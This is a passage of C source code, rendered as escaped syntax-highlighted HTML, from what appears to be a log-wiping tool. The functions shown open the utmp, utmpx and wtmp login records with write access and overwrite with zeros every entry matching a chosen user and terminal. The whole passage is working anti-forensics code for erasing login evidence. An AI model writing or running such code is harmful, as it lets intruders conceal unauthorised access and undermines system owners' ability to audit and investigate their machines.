class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eutmp\u003c/span\u003e\t\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eUTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the utmp file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eUTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eUTMP_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Copy utmp file excluding relevent entries. \n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"nf\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * UTMPX editing if supported.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#ifdef HAVE_UTMPX\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_utmpx\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e \t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eutmpx\u003c/span\u003e\t\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eUTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003efflush\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estdout\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t * Open the utmp file and temporary file.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e\t */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e \u003cspan class=\"o\"\u003e=\u003c/span\u003e \u003cspan class=\"nf\"\u003eopen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eUTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eO_RDWR\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026lt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"nf\"\u003efprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003estderr\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"s\"\u003e\u0026#34;ERROR: Opening %s\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eUTMPX_FILE\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003ereturn\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003ewhile\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"nf\"\u003eread\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026gt;\u003c/span\u003e \u003cspan class=\"mi\"\u003e0\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_name\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e))\u003c/span\u003e \u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"k\"\u003eif\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e||\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u0026amp;\u003c/span\u003e \n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t  \u003cspan class=\"o\"\u003e!\u003c/span\u003e\u003cspan class=\"nf\"\u003estrncmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e.\u003c/span\u003e\u003cspan class=\"n\"\u003eut_line\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"nf\"\u003estrlen\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e))))\u003c/span\u003e \u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ebzero\u003c/span\u003e\u003cspan class=\"p\"\u003e((\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003elseek\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e \u003cspan class=\"o\"\u003e-\u003c/span\u003e\u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e),\u003c/span\u003e \u003cspan class=\"n\"\u003eSEEK_CUR\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\t\u003cspan class=\"nf\"\u003ewrite\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"o\"\u003e\u0026amp;\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"k\"\u003esizeof\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003eutx\u003c/span\u003e\u003cspan class=\"p\"\u003e));\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\t\t\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eclose\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Done.\u003c/span\u003e\u003cspan class=\"se\"\u003e\\n\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e);\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e}\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e#endif\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cp\"\u003e\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e/*\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e * WTMP editing.\n\u003c/span\u003e\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"cm\"\u003e */\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"kt\"\u003evoid\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"nf\"\u003ewipe_wtmp\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003ewho\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"kt\"\u003echar\u003c/span\u003e \u003cspan class=\"o\"\u003e*\u003c/span\u003e\u003cspan class=\"n\"\u003eline\u003c/span\u003e\u003cspan class=\"p\"\u003e)\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\u003cspan class=\"p\"\u003e{\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"kt\"\u003eint\u003c/span\u003e\t\t\u003cspan class=\"n\"\u003efd1\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"k\"\u003estruct\u003c/span\u003e \u003cspan class=\"n\"\u003eutmp\u003c/span\u003e\t\u003cspan class=\"n\"\u003eut\u003c/span\u003e\u003cspan class=\"p\"\u003e;\u003c/span\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\n\u003c/span\u003e\u003c/span\u003e\u003cspan class=\"line\"\u003e\u003cspan class=\"cl\"\u003e\t\u003cspan class=\"nf\"\u003eprintf\u003c/span\u003e\u003cspan class=\"p\"\u003e(\u003c/span\u003e\u003cspan class=\"s\"\u003e\u0026#34;Patching %s .... \u0026#34;\u003c/span\u003e\u003cspan class=\"p\"\u003e,\u003c/span\u003e \u003cspan class=\"n\"\u003eWTMP_FILE\u003c/span\u003e\u003cspan 